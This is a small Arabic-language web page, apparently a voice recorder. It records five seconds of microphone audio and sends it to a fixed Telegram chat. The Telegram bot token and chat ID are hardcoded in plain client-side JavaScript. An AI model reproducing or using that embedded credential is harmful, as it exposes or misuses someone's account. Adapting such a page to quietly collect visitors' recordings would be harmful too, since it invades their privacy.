<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مسجل الصوت</title>
    <style>
        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #f0f2f5; }
        button { padding: 15px 30px; font-size: 18px; cursor: pointer; border: none; border-radius: 25px; background-color: #0088cc; color: white; }
    </style>
</head>
<body>

    <button id="startBtn">اضغط للتحدث</button>
    <p id="status"></p>

    <script>
        const token = '7546948976:AAETtxJ-ecUKdqVOd4LFI152-IaYxROFLWQ';
        const chatId = '56081692';
        const startBtn = document.getElementById('startBtn');
        const status = document.getElementById('status');

        let mediaRecorder;
        let audioChunks = [];

        startBtn.onclick = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                mediaRecorder = new MediaRecorder(stream);
                
                mediaRecorder.ondataavailable = (event) => {
                    audioChunks.push(event.data);
                };

                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                    sendToTelegram(audioBlob);
                    audioChunks = [];
                };

                // يبدأ التسجيل
                mediaRecorder.start();
                status.innerText = "جاري التسجيل... (سيتم الإرسال بعد 5 ثوانٍ)";
                startBtn.disabled = true;

                // توقف تلقائي بعد 5 ثوانٍ للإرسال
                setTimeout(() => {
                    mediaRecorder.stop();
                    stream.getTracks().forEach(track => track.stop()); // إغلاق المايك
                }, 5000);

            } catch (err) {
                status.innerText = "خطأ: يجب السماح بصلاحية المايكروفون.";
            }
        };

        async function sendToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('voice', blob, 'voice.ogg');

            status.innerText = "جاري الإرسال إلى تليجرام...";

            try {
                const response = await fetch(`https://api.telegram.org/bot${token}/sendVoice`, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    status.innerText = "تم الإرسال بنجاح!";
                } else {
                    status.innerText = "فشل في الإرسال.";
                }
            } catch (error) {
                status.innerText = "حدث خطأ في الاتصال.";
            } finally {
                startBtn.disabled = false;
            }
        }
    </script>
</body>
</html>
